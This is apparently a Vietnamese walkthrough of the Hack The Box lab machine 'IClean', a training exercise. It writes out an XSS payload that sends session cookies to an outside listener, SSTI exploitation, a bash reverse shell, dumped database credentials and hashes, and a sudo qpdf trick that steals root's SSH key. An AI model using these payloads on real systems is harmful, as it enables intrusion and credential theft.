# IClean

<img width="1394" height="635" alt="image" src="https://github.com/user-attachments/assets/26964553-7042-435c-83df-631dfbbe490a" />

Đầu tiên thì tôi dùng nmap để scan port:

```
❯ sudo nmap -sV -p- 10.10.11.12
[sudo] password for namdeptrai: 
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-28 12:25 +0700
Nmap scan report for capiclean.htb (10.10.11.12)
Host is up (0.054s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.51 seconds
```

Truy cập vào trình duyệt và trang web có giao diện như này:

<img width="1868" height="821" alt="image" src="https://github.com/user-attachments/assets/c09f7a74-d235-4a1f-a9e2-6af8ab28580e" />

Trong quá trình recon, tôi không phát hiện subdomain, tìm kiếm thì thấy `http://capiclean.htb/quote` là tính năng kiểu như gửi feedback về cho admin:

<img width="1853" height="554" alt="image" src="https://github.com/user-attachments/assets/c6ef6de7-2f61-40f2-93bf-008fd28c34f6" />

<img width="1875" height="837" alt="image" src="https://github.com/user-attachments/assets/8af7c881-e6a0-40f2-8e6b-a6972b4c75e3" />

Ở đây tôi thử dùng payload để gửi request đi thì được, tôi cải tạo payload để lấy cookie `<img src=1 onerror=this.src="http://10.10.14.33:8888/?"+document.cookie;>`:

<img width="1504" height="794" alt="image" src="https://github.com/user-attachments/assets/6ffefa88-a725-43a6-9346-875f2fbb54dd" />

<img width="1874" height="929" alt="image" src="https://github.com/user-attachments/assets/a68d39d7-6ba9-4763-b7a7-d9320f76c9f8" />

Lúc này thì nhờ vào kết quả của fuzzing thì tôi đã vào được dashboard kèm với cookie:

<img width="1863" height="664" alt="image" src="https://github.com/user-attachments/assets/6760b96c-7541-487b-b419-4e9c9a1b48c5" />

Tóm gọn lại thì là nó có chức năng tạo hóa đơn và tạo qr, sau đó có thể chèn link qr vào trong hóa đơn:

<img width="1856" height="663" alt="image" src="https://github.com/user-attachments/assets/d202217b-7cea-43f6-a956-95cbab37bf6d" />

Ban đầu tôi còn nghĩ đó là ssrf nhưng không được, lúc sau chèn thử `{{7*7}}` thì lại phát hiện ra là ssti:

<img width="1825" height="737" alt="image" src="https://github.com/user-attachments/assets/61c0b1e7-88ba-4a85-b1d2-4235b53f5347" />

Tôi sử dụng tools để khai thác ssti:

```
python -m fenjing crack --url 'http://capiclean.htb/QRGenerator' --detect-mode fast --inputs qr_link --method POST --extra-data 'invoice_id=&form_type=scannable_invoice&qr_link=abc' --cookies 'session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.aNjK_A.Z-HsBOoP8GByIptqBNxRs8z-oMc'
```

<img width="1885" height="942" alt="image" src="https://github.com/user-attachments/assets/0fdad896-89a7-4355-a4ab-517be74105b7" />

Dùng reverse shell để kết nối vào `bash -c 'bash -i >& /dev/tcp/10.10.14.33/1234 0>&1'`:

<img width="1039" height="390" alt="image" src="https://github.com/user-attachments/assets/39cb7182-e6d0-4ea3-8682-0710b5aa4a5d" />

Trong đây tôi tìm được cred của mysql:

```
www-data@iclean:/opt/app$ cat app	
cat app.py 
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}
```

Tôi tìm được 2 hash mật khẩu:

```
www-data@iclean:/opt/app$ ^[[A    
mysql -u iclean -p 
Enter password: pxCsmnGLckUb
use capiclean;
show tables;
select * from users;
das;
Tables_in_capiclean
quote_requests
services
users
id	username	password	role_id
1	admin	2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51	21232f297a57a5a743894a0e4a801fc3
2	consuela	0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa	ee11cbb19052e40b07aac0ca060c23ee
ERROR 1064 (42000) at line 4: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'das' at line 1
www-data@iclean:/opt/app$ 
```

Và tìm được pass của `consuela` là `simple and clean`:

<img width="1242" height="521" alt="image" src="https://github.com/user-attachments/assets/200ac87a-026e-469c-9b03-c325be424010" />

ssh được vào trong server:

<img width="1038" height="933" alt="image" src="https://github.com/user-attachments/assets/26bcddb9-161e-4f18-8307-884d4452c893" />

Ở đây có `qpdf`:

```
consuela@iclean:~$ sudo -l
[sudo] password for consuela: 
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
consuela@iclean:~$ qpdf -help
Run "qpdf --help=topic" for help on a topic.
Run "qpdf --help=--option" for help on an option.
Run "qpdf --help=all" to see all available help.

Topics:
  add-attachment: attach (embed) files
  advanced-control: tweak qpdf's behavior
  attachments: work with embedded files
  completion: shell completion
  copy-attachments: copy attachments from another file
  encryption: create encrypted files
  exit-status: meanings of qpdf's exit codes
  general: general options
  help: information about qpdf
  inspection: inspect PDF files
  json: JSON output for PDF information
  modification: change parts of the PDF
  overlay-underlay: overlay/underlay pages from other files
  page-ranges: page range syntax
  page-selection: select pages from one or more files
  pdf-dates: PDF date format
  testing: options for testing or debugging
  transformation: make structural PDF changes
  usage: basic invocation

For detailed help, visit the qpdf manual: https://qpdf.readthedocs.io
```

Chú ý đến `add-attachment`, cái này giúp đính kèm tệp vào trong tệp pdf, ý tưởng là đính kèm tệp chứa ssh key vào pdf

```
sudo /usr/bin/qpdf /home/consuela/ --add-attachment /root/.ssh/id_rsa -- lmao.pdf
```

<img width="1370" height="663" alt="image" src="https://github.com/user-attachments/assets/79f5292e-4320-4e9f-a400-be1c2c9284fb" />

Tôi lấy tạm file `message.pdf`, sau đó lấy tệp `message.pdf` và đính kèm cùng `id_rsa`, cho vào tệp `lmao.pdf` 

```
consuela@iclean:~$ wget http://10.10.14.33:8888/message.pdf
--2025-09-28 07:15:36--  http://10.10.14.33:8888/message.pdf
Connecting to 10.10.14.33:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 63583 (62K) [application/pdf]
Saving to: ‘message.pdf’

message.pdf                         100%[==================================================================>]  62.09K  --.-KB/s    in 0.1s    

2025-09-28 07:15:37 (570 KB/s) - ‘message.pdf’ saved [63583/63583]

consuela@iclean:~$ ls
message.pdf  user.txt
consuela@iclean:~$ sudo /usr/bin/qpdf /home/consuela/message.pdf --add-attachment /root/.ssh/id_rsa -- lmao.pdf
consuela@iclean:~$ ls
lmao.pdf  message.pdf  user.txt
```

Lúc này khi tải về và kiểm tra thì có ssh key:

```
❯ pdfdetach -list lmao.pdf
1 embedded files
1: id_rsa
❯ pdfdetach -saveall lmao.pdf
```

<img width="1615" height="935" alt="image" src="https://github.com/user-attachments/assets/be636900-72f4-435f-a7bb-9cf5c6917934" />

